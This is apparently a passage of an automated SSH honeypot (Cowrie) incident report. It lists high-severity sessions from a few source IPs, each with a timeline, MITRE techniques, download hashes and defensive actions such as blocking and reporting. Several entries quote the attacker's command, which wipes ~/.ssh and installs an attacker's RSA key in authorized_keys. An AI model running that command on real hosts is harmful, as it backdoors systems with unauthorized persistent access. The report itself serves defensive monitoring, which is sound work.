|---|---|
| `2026-04-25 09:25:28` | `cowrie.session.connect` |
| `2026-04-25 09:25:28` | `cowrie.client.version` |
| `2026-04-25 09:25:28` | `cowrie.client.kex` |
| `2026-04-25 09:25:29` | `cowrie.login.success` |
| `2026-04-25 09:25:29` | `cowrie.session.params` |
| `2026-04-25 09:25:29` | `cowrie.command.input` |
| `2026-04-25 09:25:29` | `cowrie.command.failed` |
| `2026-04-25 09:25:29` | `cowrie.log.closed` |
| `2026-04-25 09:25:30` | `cowrie.session.params` |
| `2026-04-25 09:25:30` | `cowrie.command.input` |
| `2026-04-25 09:25:30` | `cowrie.session.file_download` |
| `2026-04-25 09:25:30` | `cowrie.log.closed` |
| `2026-04-25 09:25:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbffb0d797fb

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-25 09:25 |
| **Last Seen** | 2026-04-25 09:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:25:32` | `cowrie.session.connect` |
| `2026-04-25 09:25:32` | `cowrie.client.version` |
| `2026-04-25 09:25:32` | `cowrie.client.kex` |
| `2026-04-25 09:25:33` | `cowrie.login.success` |
| `2026-04-25 09:25:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a8e474466dc

| Field | Detail |
|---|---|
| **Source IP** | `172.210.249[.]152` |
| **First Seen** | 2026-04-25 09:26 |
| **Last Seen** | 2026-04-25 09:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:26:57` | `cowrie.session.connect` |
| `2026-04-25 09:26:57` | `cowrie.client.version` |
| `2026-04-25 09:26:57` | `cowrie.client.kex` |
| `2026-04-25 09:26:58` | `cowrie.login.success` |
| `2026-04-25 09:26:59` | `cowrie.session.params` |
| `2026-04-25 09:26:59` | `cowrie.command.input` |
| `2026-04-25 09:26:59` | `cowrie.command.failed` |
| `2026-04-25 09:26:59` | `cowrie.log.closed` |
| `2026-04-25 09:26:59` | `cowrie.session.params` |
| `2026-04-25 09:26:59` | `cowrie.command.input` |
| `2026-04-25 09:26:59` | `cowrie.session.file_download` |
| `2026-04-25 09:26:59` | `cowrie.log.closed` |
| `2026-04-25 09:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.249[.]152` to AbuseIPDB if not already reported
- [ ] Block `172.210.249[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-873a72059a68

| Field | Detail |
|---|---|
| **Source IP** | `172.210.249[.]152` |
| **First Seen** | 2026-04-25 09:27 |
| **Last Seen** | 2026-04-25 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:27:02` | `cowrie.session.connect` |
| `2026-04-25 09:27:02` | `cowrie.client.version` |
| `2026-04-25 09:27:02` | `cowrie.client.kex` |
| `2026-04-25 09:27:03` | `cowrie.login.success` |
| `2026-04-25 09:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.249[.]152` to AbuseIPDB if not already reported
- [ ] Block `172.210.249[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9321a6b1aeee

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-25 09:27 |
| **Last Seen** | 2026-04-25 09:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:27:36` | `cowrie.session.connect` |
| `2026-04-25 09:27:36` | `cowrie.client.version` |
| `2026-04-25 09:27:36` | `cowrie.client.kex` |
| `2026-04-25 09:27:37` | `cowrie.login.success` |
| `2026-04-25 09:27:37` | `cowrie.session.params` |
| `2026-04-25 09:27:37` | `cowrie.command.input` |
| `2026-04-25 09:27:37` | `cowrie.command.failed` |
| `2026-04-25 09:27:37` | `cowrie.log.closed` |
| `2026-04-25 09:27:37` | `cowrie.session.params` |
| `2026-04-25 09:27:37` | `cowrie.command.input` |
| `2026-04-25 09:27:38` | `cowrie.session.file_download` |
| `2026-04-25 09:27:38` | `cowrie.log.closed` |
| `2026-04-25 09:27:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8722d90753e5

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-25 09:27 |
| **Last Seen** | 2026-04-25 09:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:27:40` | `cowrie.session.connect` |
| `2026-04-25 09:27:40` | `cowrie.client.version` |
| `2026-04-25 09:27:40` | `cowrie.client.kex` |
| `2026-04-25 09:27:40` | `cowrie.login.success` |
| `2026-04-25 09:27:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7383ee3f270b

| Field | Detail |
|---|---|
| **Source IP** | `172.210.249[.]152` |
| **First Seen** | 2026-04-25 09:32 |
| **Last Seen** | 2026-04-25 09:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:32:50` | `cowrie.session.connect` |
| `2026-04-25 09:32:50` | `cowrie.client.version` |
| `2026-04-25 09:32:50` | `cowrie.client.kex` |
| `2026-04-25 09:32:51` | `cowrie.login.success` |
| `2026-04-25 09:32:52` | `cowrie.session.params` |
| `2026-04-25 09:32:52` | `cowrie.command.input` |
| `2026-04-25 09:32:52` | `cowrie.command.failed` |
| `2026-04-25 09:32:52` | `cowrie.log.closed` |
| `2026-04-25 09:32:52` | `cowrie.session.params` |
| `2026-04-25 09:32:52` | `cowrie.command.input` |
| `2026-04-25 09:32:53` | `cowrie.session.file_download` |
| `2026-04-25 09:32:53` | `cowrie.log.closed` |
| `2026-04-25 09:32:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.249[.]152` to AbuseIPDB if not already reported
- [ ] Block `172.210.249[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fa191c13a8e

| Field | Detail |
|---|---|
| **Source IP** | `172.210.249[.]152` |
| **First Seen** | 2026-04-25 09:32 |
| **Last Seen** | 2026-04-25 09:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:32:55` | `cowrie.session.connect` |
| `2026-04-25 09:32:55` | `cowrie.client.version` |
| `2026-04-25 09:32:55` | `cowrie.client.kex` |
| `2026-04-25 09:32:56` | `cowrie.login.success` |
| `2026-04-25 09:32:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.249[.]152` to AbuseIPDB if not already reported
- [ ] Block `172.210.249[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d292be468eed

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-25 09:33 |
| **Last Seen** | 2026-04-25 09:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:33:14` | `cowrie.session.connect` |
| `2026-04-25 09:33:14` | `cowrie.client.version` |
| `2026-04-25 09:33:14` | `cowrie.client.kex` |
| `2026-04-25 09:33:15` | `cowrie.login.success` |
| `2026-04-25 09:33:15` | `cowrie.session.params` |
| `2026-04-25 09:33:15` | `cowrie.command.input` |
| `2026-04-25 09:33:15` | `cowrie.command.failed` |
| `2026-04-25 09:33:15` | `cowrie.log.closed` |
| `2026-04-25 09:33:15` | `cowrie.session.params` |
| `2026-04-25 09:33:15` | `cowrie.command.input` |
| `2026-04-25 09:33:15` | `cowrie.session.file_download` |
| `2026-04-25 09:33:15` | `cowrie.log.closed` |
| `2026-04-25 09:33:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9d0f6e9f655

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-25 09:33 |
| **Last Seen** | 2026-04-25 09:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:33:18` | `cowrie.session.connect` |
| `2026-04-25 09:33:18` | `cowrie.client.version` |
| `2026-04-25 09:33:18` | `cowrie.client.kex` |
| `2026-04-25 09:33:18` | `cowrie.login.success` |
| `2026-04-25 09:33:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-528704582082

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-25 09:35 |
| **Last Seen** | 2026-04-25 09:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:35:27` | `cowrie.session.connect` |
| `2026-04-25 09:35:27` | `cowrie.client.version` |
| `2026-04-25 09:35:28` | `cowrie.client.kex` |
| `2026-04-25 09:35:28` | `cowrie.login.success` |
| `2026-04-25 09:35:28` | `cowrie.session.params` |
| `2026-04-25 09:35:28` | `cowrie.command.input` |
| `2026-04-25 09:35:28` | `cowrie.command.failed` |
| `2026-04-25 09:35:29` | `cowrie.log.closed` |
| `2026-04-25 09:35:29` | `cowrie.session.params` |
| `2026-04-25 09:35:29` | `cowrie.command.input` |
| `2026-04-25 09:35:29` | `cowrie.session.file_download` |
| `2026-04-25 09:35:29` | `cowrie.log.closed` |
| `2026-04-25 09:35:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc0f6b418801

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-25 09:35 |
| **Last Seen** | 2026-04-25 09:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:35:31` | `cowrie.session.connect` |
| `2026-04-25 09:35:31` | `cowrie.client.version` |
| `2026-04-25 09:35:31` | `cowrie.client.kex` |
| `2026-04-25 09:35:32` | `cowrie.login.success` |
| `2026-04-25 09:35:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55f32e34bad8

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-25 09:36 |
| **Last Seen** | 2026-04-25 09:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:36:36` | `cowrie.session.connect` |
| `2026-04-25 09:36:36` | `cowrie.client.version` |
| `2026-04-25 09:36:36` | `cowrie.client.kex` |
| `2026-04-25 09:36:36` | `cowrie.login.success` |
| `2026-04-25 09:36:37` | `cowrie.session.params` |
| `2026-04-25 09:36:37` | `cowrie.command.input` |
| `2026-04-25 09:36:37` | `cowrie.command.failed` |
| `2026-04-25 09:36:37` | `cowrie.log.closed` |
| `2026-04-25 09:36:37` | `cowrie.session.params` |
| `2026-04-25 09:36:37` | `cowrie.command.input` |
| `2026-04-25 09:36:37` | `cowrie.session.file_download` |
| `2026-04-25 09:36:37` | `cowrie.log.closed` |
| `2026-04-25 09:36:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-449f804806e3

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-25 09:36 |
| **Last Seen** | 2026-04-25 09:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:36:39` | `cowrie.session.connect` |
| `2026-04-25 09:36:39` | `cowrie.client.version` |
| `2026-04-25 09:36:39` | `cowrie.client.kex` |
| `2026-04-25 09:36:40` | `cowrie.login.success` |
| `2026-04-25 09:36:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb1e416598b8

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-25 09:37 |
| **Last Seen** | 2026-04-25 09:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:37:41` | `cowrie.session.connect` |
| `2026-04-25 09:37:41` | `cowrie.client.version` |
| `2026-04-25 09:37:41` | `cowrie.client.kex` |
| `2026-04-25 09:37:42` | `cowrie.login.success` |
| `2026-04-25 09:37:42` | `cowrie.session.params` |
| `2026-04-25 09:37:42` | `cowrie.command.input` |
| `2026-04-25 09:37:42` | `cowrie.command.failed` |
| `2026-04-25 09:37:42` | `cowrie.log.closed` |
| `2026-04-25 09:37:42` | `cowrie.session.params` |
| `2026-04-25 09:37:42` | `cowrie.command.input` |
| `2026-04-25 09:37:42` | `cowrie.session.file_download` |
| `2026-04-25 09:37:42` | `cowrie.log.closed` |
| `2026-04-25 09:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21e9b06c0b27

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-25 09:37 |
| **Last Seen** | 2026-04-25 09:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:37:45` | `cowrie.session.connect` |
| `2026-04-25 09:37:45` | `cowrie.client.version` |
| `2026-04-25 09:37:45` | `cowrie.client.kex` |
| `2026-04-25 09:37:45` | `cowrie.login.success` |
| `2026-04-25 09:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-548b4c817556

| Field | Detail |
|---|---|
| **Source IP** | `49.72.111[.]25` |
| **First Seen** | 2026-04-25 09:39 |
| **Last Seen** | 2026-04-25 09:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:39:06` | `cowrie.session.connect` |
| `2026-04-25 09:39:06` | `cowrie.client.version` |
| `2026-04-25 09:39:06` | `cowrie.client.kex` |
| `2026-04-25 09:39:07` | `cowrie.login.success` |
| `2026-04-25 09:39:07` | `cowrie.session.params` |
| `2026-04-25 09:39:07` | `cowrie.command.input` |
| `2026-04-25 09:39:07` | `cowrie.log.closed` |
| `2026-04-25 09:39:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.72.111[.]25` to AbuseIPDB if not already reported
- [ ] Block `49.72.111[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d03f0bfa1e3

| Field | Detail |
|---|---|
| **Source IP** | `172.210.249[.]152` |
| **First Seen** | 2026-04-25 09:42 |
| **Last Seen** | 2026-04-25 09:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:42:57` | `cowrie.session.connect` |
| `2026-04-25 09:42:57` | `cowrie.client.version` |
| `2026-04-25 09:42:57` | `cowrie.client.kex` |
| `2026-04-25 09:42:58` | `cowrie.login.success` |
| `2026-04-25 09:42:58` | `cowrie.session.params` |
| `2026-04-25 09:42:58` | `cowrie.command.input` |
| `2026-04-25 09:42:58` | `cowrie.command.failed` |
| `2026-04-25 09:42:59` | `cowrie.log.closed` |
